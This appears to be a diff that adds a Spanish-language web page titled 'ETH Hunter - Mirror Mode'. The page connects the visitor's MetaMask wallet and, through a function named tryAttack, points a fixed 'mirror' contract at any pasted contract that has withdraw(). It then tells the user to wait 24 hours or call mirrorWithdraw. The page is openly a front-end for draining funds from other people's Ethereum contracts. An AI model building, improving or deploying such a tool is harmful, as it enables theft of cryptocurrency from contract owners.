@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>ETH Hunter - Mirror Mode</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: sans-serif; padding: 2rem; background: #111; color: #eee; }
+    input, button { padding: 10px; margin: 5px 0; width: 100%; font-size: 1rem; }
+    .card { border: 1px solid #333; padding: 1rem; margin-top: 1rem; background: #1e1e1e; }
+  </style>
+</head>
+<body>
+  <h1>💰 ETH Hunter - Mirror Mode</h1>
+  <p>Tu contrato: <strong>0xCEbB7900DBb60A5fF111269D88492bb04d74100E</strong></p>
+  <button onclick="connect()">🔌 Conectar Wallet</button>
+  <div>
+    <input id="target" placeholder="Pega aquí el contrato con withdraw()" />
+    <button onclick="tryAttack()">🔍 Probar contrato</button>
+  </div>
+  <div id="result" class="card"></div>
+
+  <script>
+    const MIRROR_ADDRESS = "0xCEbB7900DBb60A5fF111269D88492bb04d74100E";
+    const ABI = [
+      "function mirrorWithdraw() external",
+      "function queueTargetChange(address) external",
+      "function confirmTargetChange() external",
+      "function target() public view returns (address)",
+      "function pendingTarget() public view returns (address)",
+      "function targetChangeTimestamp() public view returns (uint256)"
+    ];
+
+    let provider, signer, contract;
+
+    async function connect() {
+      if (typeof window.ethereum !== 'undefined') {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        contract = new ethers.Contract(MIRROR_ADDRESS, ABI, signer);
+        document.getElementById("result").innerHTML = "✅ Wallet conectada correctamente.";
+      } else {
+        alert("MetaMask no detectado. Por favor instala MetaMask.");
+      }
+    }
+
+    async function tryAttack() {
+      const target = document.getElementById("target").value;
+      const resultDiv = document.getElementById("result");
+
+      if (!contract) {
+        resultDiv.innerHTML = "❌ Primero debes conectar la wallet.";
+        return;
+      }
+
+      try {
+        await contract.queueTargetChange(target);
+        resultDiv.innerHTML = "✅ Target seteado. Espera 24h o ejecuta mirrorWithdraw si el contrato lo permite.";
+      } catch (err) {
+        resultDiv.innerHTML = "❌ Error: " + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
